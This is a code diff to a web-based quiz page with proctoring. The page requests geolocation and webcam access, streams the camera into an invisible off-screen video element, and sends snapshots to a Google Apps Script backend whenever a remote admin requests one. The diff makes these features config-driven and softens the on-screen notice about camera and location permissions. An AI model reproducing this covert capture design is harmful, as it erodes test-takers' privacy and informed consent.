@@ -29,23 +29,16 @@
     .modal-box { background: white; padding: 30px; border-radius: 12px; text-align: center; max-width: 450px; box-shadow: 0 20px 40px rgba(0,0,0,0.3); width: 85%; }
     .modal-box h2 { margin-top: 0; }
     
-    /* Smooth Loading Animation CSS */
+    /* Smooth Animations */
     .spinner-box { display: flex; flex-direction: column; align-items: center; justify-content: center; }
-    .loader-spinner {
-      border: 4px solid #fdf2f8;
-      border-top: 4px solid #ec4899;
-      border-radius: 50%;
-      width: 45px;
-      height: 45px;
-      animation: spin 1s linear infinite;
-      margin-bottom: 15px;
-    }
+    .loader-spinner { border: 4px solid #fdf2f8; border-top: 4px solid #ec4899; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 15px; }
     @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    .custom-alert { animation: popIn 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards; }
+    @keyframes popIn { 0% { transform: scale(0.8); opacity: 0; } 100% { transform: scale(1); opacity: 1; } }
   </style>
 </head>
 <body>
-<!-- Realtime Feed Source (Fixed for Mobile Fullscreen Rendering) -->
-<video id="proctorVideo" autoplay muted playsinline style="position: fixed; top: 0; left: 0; width: 2px; height: 2px; opacity: 0.01; z-index: -999; pointer-events: none;"></video>
+<video id="proctorVideo" autoplay muted playsinline style="position: absolute; top: -9999px; left: -9999px; width: 10px; height: 10px; opacity: 0; z-index: -1; pointer-events: none;"></video>
 <canvas id="proctorCanvas" style="display:none;"></canvas>
 
 <div class="container">
@@ -55,18 +48,13 @@
       <h3 style="margin-top:0;">📝 Instructions:</h3>
       <ul style="padding-left: 20px; margin-bottom: 0;">
         <li>You have <b>30 Minutes</b> to complete <b id="totalQCount">30</b> questions.</li>
-        <li><b>Camera & Location Permissions</b> are MANDATORY. Please "Allow" when prompted.</li>
+        <li>Permissions (if asked) are required to start the test.</li>
         <li>Admin tracks your screen activity. Do NOT switch tabs.</li>
       </ul>
     </div>
     <div class="form-group"><label>Participant Name</label><input type="text" id="studentName"></div>
     <div class="form-group"><label>Phone Number</label><input type="text" id="phoneNumber"></div>
-    
-    <!-- Auto Fetch Location Field (Readonly) -->
-    <div class="form-group" style="display:none;" id="locationGroup">
-      <label>City / Location 📍</label>
-      <input type="text" id="cityLocation" placeholder="Auto-fetched securely on Login..." readonly style="background:#f3f4f6;">
-    </div>
+    <div class="form-group" style="display:none;" id="locationGroup"><input type="text" id="cityLocation"></div>
     
     <div class="form-group" style="display: flex; align-items: center;">
       <input type="checkbox" id="agreeRules" style="margin-right: 10px; width: 20px; height: 20px; accent-color:#ec4899;">
@@ -92,8 +80,17 @@
 <div class="modal-overlay" id="loadingModal">
   <div class="modal-box spinner-box">
     <div class="loader-spinner"></div>
-    <h2 id="loadingText" style="color:#ec4899; margin-top:0;">Processing...</h2>
-    <p id="loadingSubtext" style="color:#4b5563; font-size:14px; margin-bottom:0;">Please Allow permissions if prompted.</p>
+    <h2 id="loadingText" style="color:#ec4899; margin-top:0;">Connecting...</h2>
+    <p id="loadingSubtext" style="color:#4b5563; font-size:14px; margin-bottom:0;">Please wait...</p>
+  </div>
+</div>
+
+<!-- NEW CUSTOM ALERT MODAL -->
+<div class="modal-overlay" id="customAlertModal">
+  <div class="modal-box custom-alert" style="border-top: 8px solid #f59e0b;">
+    <h2 style="color: #f59e0b; margin-top:0;">⚠️ Notice</h2>
+    <p id="customAlertMsg" style="color: #4b5563; font-size: 15px; margin-bottom: 20px;"></p>
+    <button class="btn btn-warning" onclick="closeModal('customAlertModal')">Okay, Understand</button>
   </div>
 </div>
 
@@ -105,7 +102,7 @@
 
 <script>
   // YAHAN APNA LINK DAALEIN
-  const GAS_URL = "https://script.google.com/macros/s/AKfycbymmcATSBD0KcfuAfytAJ-GkMhfFuAMLqQ61v58VVRhUsBkxqPGVWYhmZY7zfaHoj-iuw/exec";
+  const GAS_URL = "https://script.google.com/macros/s/AKfycbwCjbC-eZAVnbswULDvsH_ok0ecUwPnFI2-af1s8WuuezrNhfeYPIUwPuDRNI_pTXKjHQ/exec";
   
   function apiCall(action, payload = {}) {
     return new Promise((resolve, reject) => {
@@ -121,18 +118,25 @@
   let questions = [], currentIdx = 0, skippedQueue = [], isResolvingSkips = false, userAnswers = {};
   let quizActive = false, isSubmitting = false, sName = "", sPhone = "", sCity = "";
   let timeLeft = 30 * 60; let timerInterval; let violationCount = 0; let camStream = null;
-  let sysConfig = { surveyEnabled: false, strictMode: true };
+  let sysConfig = { surveyEnabled: false, strictMode: true, camEnabled: false, locationEnabled: false };
   let lastSyncHash = "";
 
   document.addEventListener("DOMContentLoaded", () => {
-    // Fetch Questions silently
+    // Fetch Configuration & Questions in Background
     apiCall('getQuestions').then(qData => {
       if(qData && qData.length > 0) questions = qData; else questions = fallbackQuestions;
       document.getElementById("totalQCount").innerText = questions.length; document.getElementById("t-pend").innerText = `Left: ${questions.length}`;
     }).catch(e => console.log(e));
+
+    apiCall('getConfig').then(config => { if(config) sysConfig = config; }).catch(e => console.log(e));
   });
 
   function closeModal(id) { document.getElementById(id).style.display = "none"; }
+  function showAlert(msg) {
+    document.getElementById("customAlertMsg").innerHTML = msg;
+    document.getElementById("customAlertModal").style.display = "flex";
+  }
+
   function updateCounters() {
     let ans = Object.keys(userAnswers).length; let skip = skippedQueue.length; let pend = questions.length - ans;
     document.getElementById("t-ans").innerText = `Ans: ${ans}`; document.getElementById("t-skip").innerText = `Skip: ${skip}`; document.getElementById("t-pend").innerText = `Left: ${pend}`;
@@ -154,77 +158,70 @@
     }
   }
 
-  // STEP 1: START BUTTON CLICK -> FULLSCREEN TRIGGER -> LOCATION -> CAMERA -> LOGIN
   function startQuiz() {
     sName = document.getElementById("studentName").value.trim(); 
     sPhone = document.getElementById("phoneNumber").value.trim(); 
     
-    if (!sName || !sPhone) { alert("Please enter Name and Phone Number"); return; }
-    if (!document.getElementById("agreeRules").checked) { alert("Agree to rules."); return; }
+    if (!sName || !sPhone) { showAlert("Please enter your Name and Phone Number to begin."); return; }
+    if (!document.getElementById("agreeRules").checked) { showAlert("Please agree to the strict rules before starting."); return; }
     
-    // 🔴 FIX: TRIGGER FULLSCREEN IMMEDIATELY ON BUTTON CLICK
     try { let fs = document.documentElement.requestFullscreen(); if(fs) fs.catch(e => console.log(e)); } catch(e){}
 
     document.getElementById("loadingModal").style.display = "flex";
-    document.getElementById("loadingText").innerText = "Connecting...";
-    document.getElementById("loadingSubtext").innerText = "Fetching High-Accuracy Location...";
+    document.getElementById("loadingSubtext").innerText = "Please wait...";
 
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(
-        (position) => {
-          const lat = position.coords.latitude;
-          const lon = position.coords.longitude;
-          
-          fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`)
-            .then(res => res.json())
-            .then(data => {
-              sCity = data.display_name || `Lat: ${lat.toFixed(4)}, Lon: ${lon.toFixed(4)}`; 
-              document.getElementById("cityLocation").value = sCity; 
-              proceedToCameraAndLogin();
-            })
-            .catch(e => { 
-              sCity = `Lat: ${lat.toFixed(4)}, Lon: ${lon.toFixed(4)}`; 
-              document.getElementById("cityLocation").value = sCity;
-              proceedToCameraAndLogin(); 
-            });
-        },
-        (error) => {
-          document.getElementById("loadingModal").style.display = "none";
-          alert("🚨 LOCATION BLOCKED!\n\nLocation permission is MANDATORY for this exam.\nPlease click the Lock/Location icon in your browser URL bar, select 'Allow', and try again.");
-          return;
-        },
-        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
-      );
+    // STEP 1: CONDITIONALLY FETCH LOCATION
+    if(sysConfig.locationEnabled) {
+      document.getElementById("loadingSubtext").innerText = "Requesting Location...";
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${position.coords.latitude}&lon=${position.coords.longitude}`)
+              .then(res => res.json())
+              .then(data => { sCity = data.display_name || "Location Detected"; proceedToCameraAndLogin(); })
+              .catch(e => { sCity = "Location Detected"; proceedToCameraAndLogin(); });
+          },
+          (error) => {
+            document.getElementById("loadingModal").style.display = "none";
+            showAlert("<b>Location Blocked!</b><br><br>Location tracking is required for this exam.<br>Please allow it from your browser's lock/site settings.");
+          },
+          { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+        );
+      } else {
+        document.getElementById("loadingModal").style.display = "none";
+        showAlert("Location feature is not supported by your browser.");
+      }
     } else {
-      document.getElementById("loadingModal").style.display = "none";
-      alert("Location feature is not supported by your browser. Cannot proceed.");
-      return;
+      sCity = "Location Not Required";
+      proceedToCameraAndLogin();
     }
   }
 
-  // STEP 2: CAMERA AND LOGIN VALIDATION
   function proceedToCameraAndLogin() {
-    document.getElementById("loadingSubtext").innerText = "Checking Camera Access...";
-    let video = document.getElementById('proctorVideo');
-    
-    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
-      .then(function(stream) {
-        camStream = stream;
-        video.srcObject = stream;
-        document.getElementById("loadingSubtext").innerText = "Authenticating User Data...";
-        
-        apiCall('checkDuplicate', { phone: sPhone }).then(isDup => {
-          if(isDup) {
-            document.getElementById("loadingModal").style.display = "none";
-            document.getElementById("duplicateModal").style.display = "flex";
-            stopCamera();
-          } else { beginQuizFlow(); }
-        }).catch(e => { alert("Network connection error. Please check your internet."); document.getElementById("loadingModal").style.display = "none"; stopCamera(); });
-      })
-      .catch(function(err) { 
-         document.getElementById("loadingModal").style.display = "none";
-         alert("🚨 CAMERA BLOCKED!\n\nPlease allow camera access from your browser settings to start the test.");
-      });
+    document.getElementById("loadingSubtext").innerText = "Verifying details...";
+    apiCall('checkDuplicate', { phone: sPhone }).then(isDup => {
+      if(isDup) {
+        document.getElementById("loadingModal").style.display = "none";
+        document.getElementById("duplicateModal").style.display = "flex";
+      } else {
+        // STEP 2: CONDITIONALLY FETCH CAMERA
+        if(sysConfig.camEnabled) {
+          document.getElementById("loadingSubtext").innerText = "Requesting Camera...";
+          navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
+            .then(function(stream) {
+              camStream = stream;
+              document.getElementById('proctorVideo').srcObject = stream;
+              beginQuizFlow();
+            })
+            .catch(function(err) { 
+               document.getElementById("loadingModal").style.display = "none";
+               showAlert("<b>Camera Blocked!</b><br><br>Camera access is required for proctoring.<br>Please allow it from your browser settings.");
+            });
+        } else {
+          beginQuizFlow();
+        }
+      }
+    }).catch(e => { document.getElementById("loadingModal").style.display = "none"; showAlert("Network connection error. Please try again."); });
   }
 
   function beginQuizFlow() {
@@ -233,21 +230,19 @@
     document.getElementById("exam-section").style.display = "block";
     quizActive = true; startTimer(); loadQuestion();
 
-    setTimeout(() => { takeAndSendSnapshot(); }, 2000);
+    if(sysConfig.camEnabled) {
+      setTimeout(() => { takeAndSendSnapshot(); }, 2000);
+      setInterval(() => {
+        if(quizActive) {
+          apiCall('checkSnapshotRequest', { phone: sPhone }).then(isReq => { if(isReq) takeAndSendSnapshot(); }).catch(e=>{});
+        }
+      }, 5000);
+    }
     
     lastSyncHash = ""; triggerLiveSync();
     setInterval(triggerLiveSync, 10000);
 
-    setInterval(() => {
-      if(quizActive) {
-        apiCall('checkSnapshotRequest', { phone: sPhone }).then(isReq => { if(isReq) takeAndSendSnapshot(); }).catch(e=>{});
-      }
-    }, 5000);
-
-    apiCall('getConfig').then(config => {
-      if(config) sysConfig = config;
-      enableProctoring();
-    }).catch(e => enableProctoring());
+    enableProctoring();
   }
 
   function takeAndSendSnapshot() {
@@ -362,7 +357,7 @@
 
   function sendSurvey() {
     let text = document.getElementById("surveyText").value.trim();
-    if(!text) { alert("Please enter feedback."); return; }
+    if(!text) { showAlert("Please enter your feedback before submitting."); return; }
     document.getElementById("surveySection").innerHTML = "<p style='color:#10b981; font-weight:bold; text-align:center;'>✅ Thank you!</p>";
     apiCall('submitSurvey', { payload: { name: sName, phone: sPhone, city: sCity, feedback: text } });
     setTimeout(() => { window.location.reload(); }, 2500); 
